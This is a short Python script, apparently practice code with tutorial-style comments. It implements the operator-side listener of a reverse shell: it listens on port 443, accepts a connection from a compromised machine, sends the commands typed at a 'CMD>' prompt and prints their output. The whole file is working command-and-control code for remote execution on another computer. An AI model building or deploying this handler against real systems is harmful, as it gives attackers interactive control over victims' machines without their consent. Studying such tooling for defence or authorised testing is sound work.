import socket

# creating instantiated object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# create listener
s.bind(("0.0.0.0", 443))

# enable listener
s.listen()

# naming variables
conn, addr = s.accept()

# dirty debugging by using str()
#print("Connection: " + str(conn))
#print("Address: " + str(addr))

# print array of the IP address
print("Connection received from: " + addr[0])

# create while loop
# get input from the command line
while True:
    command = input("CMD> ")

    # command block
    
    # if the received command equals "exit" then close the socket
    if command == 'exit':
        conn.send("exit".encode('UTF-8'))
        conn.close()
        # break terminates the script because it exits the loop
        break
    # else is optional but cleaner
    else:
        # interacting with conn object to send command and decode it as bytes
        conn.send(command.encode('UTF-8'))

        # receiving output from client
        print(conn.recv(4096).decode('UTF-8'))